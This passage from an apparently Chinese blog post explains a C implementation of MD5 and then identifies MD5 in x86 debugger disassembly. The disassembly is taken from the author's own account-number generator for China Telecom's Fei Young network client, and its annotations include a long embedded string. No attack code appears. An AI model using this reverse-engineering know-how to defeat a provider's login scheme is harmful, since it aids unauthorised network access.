d, x[<span class="number">13</span>], <span class="number">5</span>, <span class="number">0xa9e3e905</span>); <span class="comment">/* 29 */</span></span><br><span class="line">    GG(d, a, b, c, x[<span class="number">2</span>], <span class="number">9</span>, <span class="number">0xfcefa3f8</span>); <span class="comment">/* 30 */</span></span><br><span class="line">    GG(c, d, a, b, x[<span class="number">7</span>], <span class="number">14</span>, <span class="number">0x676f02d9</span>); <span class="comment">/* 31 */</span></span><br><span class="line">    GG(b, c, d, a, x[<span class="number">12</span>], <span class="number">20</span>, <span class="number">0x8d2a4c8a</span>); <span class="comment">/* 32 */</span></span><br><span class="line">    </span><br><span class="line">                                           <span class="comment">/* Round 3 */</span></span><br><span class="line">    HH(a, b, c, d, x[<span class="number">5</span>], <span class="number">4</span>, <span class="number">0xfffa3942</span>); <span class="comment">/* 33 */</span></span><br><span class="line">    HH(d, a, b, c, x[<span class="number">8</span>], <span class="number">11</span>, <span class="number">0x8771f681</span>); <span class="comment">/* 34 */</span></span><br><span class="line">    HH(c, d, a, b, x[<span class="number">11</span>], <span class="number">16</span>, <span class="number">0x6d9d6122</span>); <span class="comment">/* 35 */</span></span><br><span class="line">    HH(b, c, d, a, x[<span class="number">14</span>], <span class="number">23</span>, <span class="number">0xfde5380c</span>); <span class="comment">/* 36 */</span></span><br><span class="line">    HH(a, b, c, d, x[<span class="number">1</span>], <span class="number">4</span>, <span class="number">0xa4beea44</span>); <span class="comment">/* 37 */</span></span><br><span class="line">    HH(d, a, b, c, x[<span class="number">4</span>], <span class="number">11</span>, <span class="number">0x4bdecfa9</span>); <span class="comment">/* 38 */</span></span><br><span class="line">    HH(c, d, a, b, x[<span class="number">7</span>], <span class="number">16</span>, <span class="number">0xf6bb4b60</span>); <span class="comment">/* 39 */</span></span><br><span class="line">    HH(b, c, d, a, x[<span class="number">10</span>], <span class="number">23</span>, <span class="number">0xbebfbc70</span>); <span class="comment">/* 40 */</span></span><br><span class="line">    HH(a, b, c, d, x[<span class="number">13</span>], <span class="number">4</span>, <span class="number">0x289b7ec6</span>); <span class="comment">/* 41 */</span></span><br><span class="line">    HH(d, a, b, c, x[<span class="number">0</span>], <span class="number">11</span>, <span class="number">0xeaa127fa</span>); <span class="comment">/* 42 */</span></span><br><span class="line">    HH(c, d, a, b, x[<span class="number">3</span>], <span class="number">16</span>, <span class="number">0xd4ef3085</span>); <span class="comment">/* 43 */</span></span><br><span class="line">    HH(b, c, d, a, x[<span class="number">6</span>], <span class="number">23</span>, <span class="number">0x4881d05</span>); <span class="comment">/* 44 */</span></span><br><span class="line">    HH(a, b, c, d, x[<span class="number">9</span>], <span class="number">4</span>, <span class="number">0xd9d4d039</span>); <span class="comment">/* 45 */</span></span><br><span class="line">    HH(d, a, b, c, x[<span class="number">12</span>], <span class="number">11</span>, <span class="number">0xe6db99e5</span>); <span class="comment">/* 46 */</span></span><br><span class="line">    HH(c, d, a, b, x[<span class="number">15</span>], <span class="number">16</span>, <span class="number">0x1fa27cf8</span>); <span class="comment">/* 47 */</span></span><br><span class="line">    HH(b, c, d, a, x[<span class="number">2</span>], <span class="number">23</span>, <span class="number">0xc4ac5665</span>); <span class="comment">/* 48 */</span></span><br><span class="line">    </span><br><span class="line">                                          <span class="comment">/* Round 4 */</span></span><br><span class="line">    II(a, b, c, d, x[<span class="number">0</span>], <span class="number">6</span>, <span class="number">0xf4292244</span>); <span class="comment">/* 49 */</span></span><br><span class="line">    II(d, a, b, c, x[<span class="number">7</span>], <span class="number">10</span>, <span class="number">0x432aff97</span>); <span class="comment">/* 50 */</span></span><br><span class="line">    II(c, d, a, b, x[<span class="number">14</span>], <span class="number">15</span>, <span class="number">0xab9423a7</span>); <span class="comment">/* 51 */</span></span><br><span class="line">    II(b, c, d, a, x[<span class="number">5</span>], <span class="number">21</span>, <span class="number">0xfc93a039</span>); <span class="comment">/* 52 */</span></span><br><span class="line">    II(a, b, c, d, x[<span class="number">12</span>], <span class="number">6</span>, <span class="number">0x655b59c3</span>); <span class="comment">/* 53 */</span></span><br><span class="line">    II(d, a, b, c, x[<span class="number">3</span>], <span class="number">10</span>, <span class="number">0x8f0ccc92</span>); <span class="comment">/* 54 */</span></span><br><span class="line">    II(c, d, a, b, x[<span class="number">10</span>], <span class="number">15</span>, <span class="number">0xffeff47d</span>); <span class="comment">/* 55 */</span></span><br><span class="line">    II(b, c, d, a, x[<span class="number">1</span>], <span class="number">21</span>, <span class="number">0x85845dd1</span>); <span class="comment">/* 56 */</span></span><br><span class="line">    II(a, b, c, d, x[<span class="number">8</span>], <span class="number">6</span>, <span class="number">0x6fa87e4f</span>); <span class="comment">/* 57 */</span></span><br><span class="line">    II(d, a, b, c, x[<span class="number">15</span>], <span class="number">10</span>, <span class="number">0xfe2ce6e0</span>); <span class="comment">/* 58 */</span></span><br><span class="line">    II(c, d, a, b, x[<span class="number">6</span>], <span class="number">15</span>, <span class="number">0xa3014314</span>); <span class="comment">/* 59 */</span></span><br><span class="line">    II(b, c, d, a, x[<span class="number">13</span>], <span class="number">21</span>, <span class="number">0x4e0811a1</span>); <span class="comment">/* 60 */</span></span><br><span class="line">    II(a, b, c, d, x[<span class="number">4</span>], <span class="number">6</span>, <span class="number">0xf7537e82</span>); <span class="comment">/* 61 */</span></span><br><span class="line">    II(d, a, b, c, x[<span class="number">11</span>], <span class="number">10</span>, <span class="number">0xbd3af235</span>); <span class="comment">/* 62 */</span></span><br><span class="line">    II(c, d, a, b, x[<span class="number">2</span>], <span class="number">15</span>, <span class="number">0x2ad7d2bb</span>); <span class="comment">/* 63 */</span></span><br><span class="line">    II(b, c, d, a, x[<span class="number">9</span>], <span class="number">21</span>, <span class="number">0xeb86d391</span>); <span class="comment">/* 64 */</span></span><br><span class="line">    state[<span class="number">0</span>] += a;</span><br><span class="line">    state[<span class="number">1</span>] += b;</span><br><span class="line">    state[<span class="number">2</span>] += c;</span><br><span class="line">    state[<span class="number">3</span>] += d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="分析"><a class="header-anchor" href="#分析"></a>分析</h2><p>MD5加密分三步：</p><p><code>MD5Init(MD5_CTX *context)</code></p><p><code>MD5Update(MD5_CTX *context, unsigned char *input, unsigned int inputlen)</code></p><p><code>MD5Final(MD5_CTX *context, unsigned char digest[16])</code></p><p>以下分别对三个函数进行分析：</p><p>首先MD5的数据存储结构是一个<code>MD5_CTX</code>类型的结构体:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">// 存储原始信息的bits数长度,不包括填充的bits</span></span><br><span class="line">    <span class="comment">// 最长为 2^64 bits，因为2^64是一个64位数的最大值</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> count[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> state[<span class="number">4</span>];        <span class="comment">// 存放每步摘要的变量</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];    <span class="comment">// 存放输入的信息的缓冲区，512bits</span></span><br><span class="line">&#125;MD5_CTX;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置存放结果的变量并初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Init</span><span class="params">(MD5_CTX *context)</span>            </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    context-&gt;count[<span class="number">0</span>] = <span class="number">0</span>;        </span><br><span class="line">    context-&gt;count[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    context-&gt;state[<span class="number">0</span>] = <span class="number">0x67452301</span>;        <span class="comment">// 这里是计算摘要的四个初始化变量</span></span><br><span class="line">    context-&gt;state[<span class="number">1</span>] = <span class="number">0xEFCDAB89</span>;        <span class="comment">// 这四个数可以作为md5加密的标志</span></span><br><span class="line">    context-&gt;state[<span class="number">2</span>] = <span class="number">0x98BADCFE</span>;        </span><br><span class="line">    context-&gt;state[<span class="number">3</span>] = <span class="number">0x10325476</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上四个数在内存中的形式为：</p><p><code>01 23 45 67 89 AB CD EF</code><br><code>FE DC BA 98 76 54 32 10 </code></p><p>共16个字节。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*将与加密的信息传递给md5结构，可以多次调用</span></span><br><span class="line"><span class="comment">context：初始化过了的md5结构</span></span><br><span class="line"><span class="comment">input：欲加密的信息，可以任意长</span></span><br><span class="line"><span class="comment">inputLen：指定input的长度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Update</span><span class="params">(MD5_CTX *context, <span class="keyword">unsigned</span> <span class="keyword">char</span> *input, <span class="keyword">unsigned</span> <span class="keyword">int</span> inputlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, index = <span class="number">0</span>, partlen = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 计算已有信息bits mod 64, 64bytes=512bits。</span></span><br><span class="line">    index = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">    </span><br><span class="line">    partlen = <span class="number">64</span> - index;</span><br><span class="line">    context-&gt;count[<span class="number">0</span>] += inputlen &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Update number of bits</span></span><br><span class="line">    <span class="keyword">if</span> (context-&gt;count[<span class="number">0</span>] &lt; (inputlen &lt;&lt; <span class="number">3</span>))</span><br><span class="line">        context-&gt;count[<span class="number">1</span>]++;</span><br><span class="line">    context-&gt;count[<span class="number">1</span>] += inputlen &gt;&gt; <span class="number">29</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (inputlen &gt;= partlen)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 不够长的填满512bits，放入context-&gt;buffer缓冲区</span></span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;context-&gt;<span class="built_in">buffer</span>[index], input, partlen);</span><br><span class="line">        MD5Transform(context-&gt;state, context-&gt;<span class="built_in">buffer</span>);</span><br><span class="line">        <span class="comment">// 如果还有剩余字节，对剩余字节进行计算</span></span><br><span class="line">        <span class="keyword">for</span> (i = partlen; i + <span class="number">64</span> &lt;= inputlen; i += <span class="number">64</span>)</span><br><span class="line">            MD5Transform(context-&gt;state, &amp;input[i]);</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不够长的填满512bits，放入context-&gt;buffer缓冲区</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;context-&gt;<span class="built_in">buffer</span>[index], &amp;input[i], inputlen - i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*获取加密 的最终结果</span></span><br><span class="line"><span class="comment">digest：保存最终的加密串</span></span><br><span class="line"><span class="comment">context：前面初始化并填入了信息的md5结构体</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Final</span><span class="params">(MD5_CTX *context, <span class="keyword">unsigned</span> <span class="keyword">char</span> digest[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> index = <span class="number">0</span>, padlen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> bits[<span class="number">8</span>];</span><br><span class="line">    <span class="comment">// 计算所有的bits长度的字节数 mod 64</span></span><br><span class="line">    index = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">    <span class="comment">// 计算需要填充的字节数，padlen的取值范围在1-64之间</span></span><br><span class="line">    padlen = (index &lt; <span class="number">56</span>) ? (<span class="number">56</span> - index) : (<span class="number">120</span> - index);</span><br><span class="line">    <span class="comment">// 将要被转换的信息(所有的)的bits长度拷贝到bits中</span></span><br><span class="line">    MD5Encode(bits, context-&gt;count, <span class="number">8</span>);    </span><br><span class="line">    MD5Update(context, PADDING, padlen);</span><br><span class="line">    <span class="comment">/* Append length (before padding) */</span></span><br><span class="line">    MD5Update(context, bits, <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// 将最终的结果保存到digest中</span></span><br><span class="line">    MD5Encode(digest, context-&gt;state, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="逆向分析"><a class="header-anchor" href="#逆向分析"></a>逆向分析</h2><p>下面来看看编译过的md5程序的反汇编特征：</p><p>以之前写过的天翼飞YOUNG算号器为例（注释中的行号跟上面的c代码对应）：</p><p><code>MD5Init(MD5_CTX *context) :</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">00BF31D0 | 55                       | push ebp                                | md5.c:10</span><br><span class="line">00BF31D1 | 8BEC                     | mov ebp,esp                             |</span><br><span class="line">00BF31D3 | 81EC C0000000            | sub esp,C0                              |</span><br><span class="line">00BF31D9 | 53                       | push ebx                                |</span><br><span class="line">00BF31DA | 56                       | push esi                                |</span><br><span class="line">00BF31DB | 57                       | push edi                                |</span><br><span class="line">00BF31DC | 8DBD 40FFFFFF            | lea edi,dword ptr ss:[ebp-C0]           |</span><br><span class="line">00BF31E2 | B9 30000000              | mov ecx,30                              | 30:&#39;0&#39;</span><br><span class="line">00BF31E7 | B8 CCCCCCCC              | mov eax,CCCCCCCC                        |</span><br><span class="line">00BF31EC | F3:AB                    | rep stosd                               |</span><br><span class="line">00BF31EE | B9 0DF0BF00              | mov ecx,f-young3.10_c.BFF00D            | md5.c:15732480</span><br><span class="line">00BF31F3 | E8 42E0FFFF              | call f-young3.10_c.BF123A               |</span><br><span class="line">00BF31F8 | B8 04000000              | mov eax,4                               | md5.c:11</span><br><span class="line">00BF31FD | 6BC8 00                  | imul ecx,eax,0                          |</span><br><span class="line">00BF3200 | 8B55 08                  | mov edx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF3203 | C7040A 00000000          | mov dword ptr ds:[edx+ecx],0            |</span><br><span class="line">00BF320A | B8 04000000              | mov eax,4                               | md5.c:12</span><br><span class="line">00BF320F | C1E0 00                  | shl eax,0                               |</span><br><span class="line">00BF3212 | 8B4D 08                  | mov ecx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF3215 | C70401 00000000          | mov dword ptr ds:[ecx+eax],0            |</span><br><span class="line">00BF321C | B8 04000000              | mov eax,4                               | md5.c:13</span><br><span class="line">00BF3221 | 6BC8 00                  | imul ecx,eax,0                          |</span><br><span class="line">00BF3224 | 8B55 08                  | mov edx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF3227 | C7440A 08 01234567       | mov dword ptr ds:[edx+ecx+8],67452301   |</span><br><span class="line">00BF322F | B8 04000000              | mov eax,4                               | md5.c:14</span><br><span class="line">00BF3234 | C1E0 00                  | shl eax,0                               |</span><br><span class="line">00BF3237 | 8B4D 08                  | mov ecx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF323A | C74401 08 89ABCDEF       | mov dword ptr ds:[ecx+eax+8],EFCDAB89   |</span><br><span class="line">00BF3242 | B8 04000000              | mov eax,4                               | md5.c:15</span><br><span class="line">00BF3247 | D1E0                     | shl eax,1                               |</span><br><span class="line">00BF3249 | 8B4D 08                  | mov ecx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF324C | C74401 08 FEDCBA98       | mov dword ptr ds:[ecx+eax+8],98BADCFE   |</span><br><span class="line">00BF3254 | B8 04000000              | mov eax,4                               | md5.c:16</span><br><span class="line">00BF3259 | 6BC8 03                  | imul ecx,eax,3                          |</span><br><span class="line">00BF325C | 8B55 08                  | mov edx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF325F | C7440A 08 76543210       | mov dword ptr ds:[edx+ecx+8],10325476   |</span><br><span class="line">00BF3267 | 5F                       | pop edi                                 | md5.c:17</span><br><span class="line">00BF3268 | 5E                       | pop esi                                 |</span><br><span class="line">00BF3269 | 5B                       | pop ebx                                 |</span><br><span class="line">00BF326A | 81C4 C0000000            | add esp,C0                              |</span><br><span class="line">00BF3270 | 3BEC                     | cmp ebp,esp                             |</span><br><span class="line">00BF3272 | E8 CDDFFFFF              | call f-young3.10_c.BF1244               |</span><br><span class="line">00BF3277 | 8BE5                     | mov esp,ebp                             |</span><br><span class="line">00BF3279 | 5D                       | pop ebp                                 |</span><br><span class="line">00BF327A | C3                       | ret                                     |</span><br></pre></td></tr></table></figure><p><code>MD5Update(MD5_CTX *context, unsigned char *input, unsigned int inputlen):</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">00BF4940 | 55                       | push ebp                                | md5.c:19</span><br><span class="line">00BF4941 | 8BEC                     | mov ebp,esp                             |</span><br><span class="line">00BF4943 | 81EC E4000000            | sub esp,E4                              |</span><br><span class="line">00BF4949 | 53                       | push ebx                                |</span><br><span class="line">00BF494A | 56                       | push esi                                |</span><br><span class="line">00BF494B | 57                       | push edi                                |</span><br><span class="line">00BF494C | 8DBD 1CFFFFFF            | lea edi,dword ptr ss:[ebp-E4]           |</span><br><span class="line">00BF4952 | B9 39000000              | mov ecx,39                              | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;, 39:&#39;9&#39;</span><br><span class="line">00BF4957 | B8 CCCCCCCC              | mov eax,CCCCCCCC                        |</span><br><span class="line">00BF495C | F3:AB                    | rep stosd                               |</span><br><span class="line">00BF495E | B9 0DF0BF00              | mov ecx,f-young3.10_c.BFF00D            | md5.c:15732480, ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4963 | E8 D2C8FFFF              | call f-young3.10_c.BF123A               |</span><br><span class="line">00BF4968 | C745 F8 00000000         | mov dword ptr ss:[ebp-8],0              | md5.c:20</span><br><span class="line">00BF496F | C745 EC 00000000         | mov dword ptr ss:[ebp-14],0             |</span><br><span class="line">00BF4976 | C745 E0 00000000         | mov dword ptr ss:[ebp-20],0             |</span><br><span class="line">00BF497D | B8 04000000              | mov eax,4                               | md5.c:21</span><br><span class="line">00BF4982 | 6BC8 00                  | imul ecx,eax,0                          | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4985 | 8B55 08                  | mov edx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF4988 | 8B040A                   | mov eax,dword ptr ds:[edx+ecx]          |</span><br><span class="line">00BF498B | C1E8 03                  | shr eax,3                               |</span><br><span class="line">00BF498E | 83E0 3F                  | and eax,3F                              |</span><br><span class="line">00BF4991 | 8945 EC                  | mov dword ptr ss:[ebp-14],eax           |</span><br><span class="line">00BF4994 | B8 40000000              | mov eax,40                              | md5.c:22, 40:&#39;@&#39;</span><br><span class="line">00BF4999 | 2B45 EC                  | sub eax,dword ptr ss:[ebp-14]           |</span><br><span class="line">00BF499C | 8945 E0                  | mov dword ptr ss:[ebp-20],eax           |</span><br><span class="line">00BF499F | B8 04000000              | mov eax,4                               | md5.c:23</span><br><span class="line">00BF49A4 | 6BC8 00                  | imul ecx,eax,0                          | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF49A7 | 8B55 08                  | mov edx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF49AA | 8B040A                   | mov eax,dword ptr ds:[edx+ecx]          |</span><br><span class="line">00BF49AD | 8B4D 10                  | mov ecx,dword ptr ss:[ebp+10]           | [ebp+10]:&amp;&quot;ALLUSERSPROFILE&#x3D;C:\\ProgramData&quot;</span><br><span class="line">00BF49B0 | 8D14C8                   | lea edx,dword ptr ds:[eax+ecx*8]        |</span><br><span class="line">00BF49B3 | B8 04000000              | mov eax,4                               |</span><br><span class="line">00BF49B8 | 6BC8 00                  | imul ecx,eax,0                          | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF49BB | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF49BE | 891408                   | mov dword ptr ds:[eax+ecx],edx          |</span><br><span class="line">00BF49C1 | B8 04000000              | mov eax,4                               | md5.c:24</span><br><span class="line">00BF49C6 | 6BC8 00                  | imul ecx,eax,0                          | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF49C9 | 8B55 10                  | mov edx,dword ptr ss:[ebp+10]           | [ebp+10]:&amp;&quot;ALLUSERSPROFILE&#x3D;C:\\ProgramData&quot;</span><br><span class="line">00BF49CC | C1E2 03                  | shl edx,3                               |</span><br><span class="line">00BF49CF | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF49D2 | 391408                   | cmp dword ptr ds:[eax+ecx],edx          |</span><br><span class="line">00BF49D5 | 73 1F                    | jae f-young3.10_c.BF49F6                |</span><br><span class="line">00BF49D7 | B8 04000000              | mov eax,4                               | md5.c:25</span><br><span class="line">00BF49DC | C1E0 00                  | shl eax,0                               |</span><br><span class="line">00BF49DF | 8B4D 08                  | mov ecx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF49E2 | 8B1401                   | mov edx,dword ptr ds:[ecx+eax]          |</span><br><span class="line">00BF49E5 | 83C2 01                  | add edx,1                               |</span><br><span class="line">00BF49E8 | B8 04000000              | mov eax,4                               |</span><br><span class="line">00BF49ED | C1E0 00                  | shl eax,0                               |</span><br><span class="line">00BF49F0 | 8B4D 08                  | mov ecx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF49F3 | 891401                   | mov dword ptr ds:[ecx+eax],edx          |</span><br><span class="line">00BF49F6 | B8 04000000              | mov eax,4                               | md5.c:26</span><br><span class="line">00BF49FB | C1E0 00                  | shl eax,0                               |</span><br><span class="line">00BF49FE | 8B4D 10                  | mov ecx,dword ptr ss:[ebp+10]           | [ebp+10]:&amp;&quot;ALLUSERSPROFILE&#x3D;C:\\ProgramData&quot;</span><br><span class="line">00BF4A01 | C1E9 1D                  | shr ecx,1D                              | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4A04 | 8B55 08                  | mov edx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF4A07 | 030C02                   | add ecx,dword ptr ds:[edx+eax]          | 